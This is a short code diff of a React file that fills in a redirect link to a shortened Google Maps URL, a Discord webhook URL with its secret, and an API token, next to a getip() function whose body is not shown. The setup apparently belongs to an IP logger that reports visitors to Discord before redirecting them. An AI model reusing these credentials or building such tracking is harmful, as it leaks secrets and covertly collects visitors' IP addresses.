@@ -1,8 +1,8 @@
 import React, { useState, useEffect } from 'react';
 
-const redirectlink = ""
-const webhook = ""
-const token = ""
+const redirectlink = "https://maps.app.goo.gl/hnSxwfP4AnBd2ReeA"
+const webhook = "https://discord.com/api/webhooks/1272762463716245557/ItZzVV_mNDaWRnMyNW92R3JXZOC57erdlN_TNl9ySsxwBCfnq-F2CYR6KKyRNaPxZSf0"
+const token = "8b120d3ca54ef9"
 
 async function getip() {
 
